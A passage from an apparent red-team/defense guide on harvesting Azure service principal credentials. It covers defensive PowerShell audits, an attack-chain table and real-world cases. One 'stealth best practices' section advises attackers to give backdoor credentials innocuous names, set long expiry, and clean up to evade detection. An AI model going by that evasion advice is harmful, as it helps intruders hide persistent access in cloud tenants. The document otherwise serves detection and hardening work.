$inactiveSPs = @()

$allSPs = Get-MgServicePrincipal -All

foreach ($sp in $allSPs) {
    # Get last sign-in for this SP
    $lastSignin = Get-MgAuditLogSignIn -Filter "servicePrincipalName eq '$($sp.DisplayName)'" -Top 1 | Select-Object -First 1
    
    if ($null -eq $lastSignin -or $lastSignin.CreatedDateTime -lt $cutoffDate) {
        # No sign-in or inactive
        $credentials = Get-MgServicePrincipalCredential -ServicePrincipalId $sp.Id
        
        if ($credentials.Count -gt 0) {
            Write-Host "[!] Inactive SP with credentials: $($sp.DisplayName)"
            Write-Host "    Last sign-in: $(if ($lastSignin) { $lastSignin.CreatedDateTime } else { 'NEVER' })"
            Write-Host "    Credentials to remove: $($credentials.Count)"
        }
    }
}
```

---

#### RBAC / Attribute-based access control (ABAC)

**7. Assign specific Application Developer role instead of Application Administrator**

**Manual Steps:**
- Replace Application Administrator with **Application Developer** role (can create/manage own apps, not others)
- Or use **Cloud Application Administrator** with restrictions on specific apps

**Validation Command (Verify Fix):**

```powershell
$appAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Application Administrator'"
$humanMembers = Get-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id | Where-Object { $_.'@odata.type' -notmatch 'servicePrincipal' }

if ($humanMembers.Count -eq 0) {
    Write-Host "[✓] No human users with Application Administrator role"
} else {
    Write-Host "[✗] Found $($humanMembers.Count) human users with Application Administrator role - should be reviewed"
}
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent grant OAuth attacks | Attacker tricks user into granting OAuth consent |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker escalates app permissions |
| **3** | **Current Step** | **[CA-UNSC-010]** | **Attacker harvests service principal credentials** |
| **4** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker uses credential to pivot to other resources |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker uses high-privilege SP credential to add persistence |
| **6** | **Impact** | Custom script | Attacker accesses M365, exports data, establishes C2 |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Application Administrator Escalation (Redfox Security)

**Attack Path:**
1. Compromise user account with Application Administrator role (via phishing)
2. Identify service principal with Privileged Role Administrator role
3. Create new credential on that service principal
4. Authenticate as the service principal
5. Use Privileged Role Administrator role to add attacker user as Global Administrator
6. Delete the attacker's login records in audit logs
7. Maintain persistent Global Admin access

**Detection Failure:** Credential creation and sign-in activity not monitored; audit log deletion not detected

**Reference:** [Redfox Security - Azure Privilege Escalation Via Service Principal](https://redfoxsec.com/blog/azure-privilege-escalation-via-service-principal/)

---

### Example 2: CI/CD Pipeline Service Principal Compromise

**Scenario:** Attacker compromises CI/CD pipeline (GitHub Actions, Azure DevOps) which has service principal credentials embedded

**Attack:**
1. Extract service principal credentials from pipeline logs or configuration files
2. Use credentials to authenticate to Azure
3. Enumerate other resources the compromised service principal can access
4. Escalate via RBAC misconfiguration

**Detection Opportunity:** Monitor for service principal sign-ins from unusual locations (CI/CD logs should be from known IP ranges)

---

### Example 3: Scattered Spider Campaign

**Known TTP:** Scattered Spider actively harvests service principal credentials as part of comprehensive credential theft

**Methods Used:**
- `Get-AzADServicePrincipal` enumeration
- `New-AzureADApplicationPasswordCredential` for credential creation
- Targeting high-privilege service principals (Global Admin, PRA, Exchange Admin)

**Reference:** [GuidePoint Security - Scattered Spider Analysis](https://www.guidepointsecurity.com/blog/worldwide-web-an-analysis-of-tactics-and-techniques-attributed-to-scattered-spider/)

---

## 10. OPERATIONAL CONSIDERATIONS

### Stealth Best Practices

1. **Create credentials with innocent-sounding display names:**
   - ❌ `"Backdoor Access"`
   - ✅ `"Maintenance Sync"`, `"Scheduled Backup"`, `"System Migration"`

2. **Set far-future expiration dates** (2-5 years) to maintain persistence without re-visiting

3. **Remove newly created credentials after establishing alternative access** (e.g., after getting Global Admin role via privilege escalation) to reduce detection surface

4. **Use service principal authentication** instead of user account when harvesting credentials (less conspicuous in audit logs)

### Credential Management Best Practices (Defense)

1. **Rotate all service principal credentials quarterly**
2. **Audit all application owners monthly** for least privilege
3. **Disable credentials on service principals not used in 30+ days**
4. **Monitor for any ApplicationAdministrator role usage** (should be rare)
5. **Enforce Managed Identity usage** for Azure services (no credentials needed)
6. **Require multi-factor authentication** for Application Administrator operations

### Compliance Implications

Failure to detect service principal credential compromise violates:
- **CIS Azure Benchmarks:** Sections 1.1, 1.3 (service principal governance)
- **NIST 800-53:** IA-2 (authentication), AC-6 (least privilege)
- **GDPR:** Art. 32 (security of processing)
- **ISO 27001:** A.9.1 (user access management)

Organizations must maintain audit logs of all service principal credential operations for 90+ days and actively monitor for anomalies.

